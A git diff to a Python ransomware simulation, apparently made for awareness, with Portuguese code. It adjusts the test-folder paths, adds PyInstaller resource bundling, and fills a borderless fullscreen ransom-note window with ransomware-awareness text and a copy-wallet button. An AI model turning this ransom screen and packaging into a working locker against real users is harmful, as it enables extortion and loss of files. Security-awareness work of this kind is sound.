@@ -4,14 +4,11 @@ import platform
 import tkinter as tk
 from PIL import Image, ImageTk
 import sys
-import tkinter as tk
-from PIL import Image, ImageTk
-import sys
 
 def user_name():
     if os.name == 'posix':
         return os.getenv('USER') 
-    elif os.name == 'nt':    
+    elif os.name == 'nt':
         return os.getenv('USERNAME')
 
 def generate_key():
@@ -70,7 +67,7 @@ def identificar_so():
         distro = platform.freedesktop_os_release()
         print(distro['NAME'], distro['VERSION'])
         nome = user_name()
-        diretorio = f'/home/{nome}/Documentos/teste'
+        diretorio = f'/home/{nome}/Documents/teste'
     
         
     else:
@@ -98,7 +95,7 @@ def on_decrypt_button_click():
         if sistema == 'Windows':
             diretorio_path = f'C:\\Users\\{nome}\\Documentos\\Teste'
         elif sistema == 'Linux':
-            diretorio_path = f'/home/{nome}/Documentos/teste'
+            diretorio_path = f'/home/{nome}/Documents/teste'
         else:
             print(f'Sistema Operacional não reconhecido: {sistema}')
             return
@@ -112,19 +109,31 @@ def on_decrypt_button_click():
 
         print('Processo de descriptografia realizado com sucesso')
 
+
+def resource_path(relative_path):
+    """ Retorna o caminho para o recurso, funciona para desenvolvimento e para executável único """
+    try:
+        # PyInstaller cria uma pasta temporária e armazena o caminho em _MEIPASS
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, relative_path)
+
+
 def exibir_conscientizacao():
     janela = tk.Tk()
     janela.title("Descriptografia")
     janela.geometry("1920x1080")
     janela.overrideredirect(True)
 
-    imagem_fundo = Image.open("imagens/fundo.jpeg")
+    imagem_fundo = Image.open(resource_path("imagens/fundo.jpeg"))
     imagem_fundo = ImageTk.PhotoImage(imagem_fundo)
 
     label_fundo = tk.Label(janela, image=imagem_fundo)
     label_fundo.place(relwidth=1,relheight=1)
 
-    cadeado = Image.open("imagens/cadeado.png")
+    cadeado = Image.open(resource_path("imagens/cadeado.png"))
     cadeado = cadeado.resize((253,274))
     imagem_cadeado = ImageTk.PhotoImage(cadeado)
 
@@ -144,7 +153,7 @@ def exibir_conscientizacao():
     tempo_pagamento.pack(anchor=tk.CENTER,pady=20)
 
     caixa_explicativa = tk.Text(janela, wrap="word", width=40, height=20, bg="black", fg="red", bd=0)
-    caixa_explicativa.insert(tk.END, """teste teste teste""")
+    caixa_explicativa.insert(tk.END, """O ransomware é uma ameaça digital cada vez mais presente em nosso mundo conectado. Trata-se de um tipo de malware que, quando executado em um computador, criptografa os arquivos do usuário, tornando-os inacessíveis. Os cibercriminosos por trás desse ataque, então, exigem um resgate em troca da chave de descriptografia, ameaçando a perda permanente de dados valiosos. Para garantir a segurança de suas informações, é fundamental que todos estejam cientes dos riscos associados ao ransomware e saibam como se proteger.""")
     caixa_explicativa.place(relx=0.05, rely=0.5, anchor="w")
 
     botao_copia = tk.Button(janela, bg="black",fg="red", text="Copiar Carteira", command=lambda:'39279fshdfskbAWEas342ssfe24afgDWkl2313jnsp$Mw')
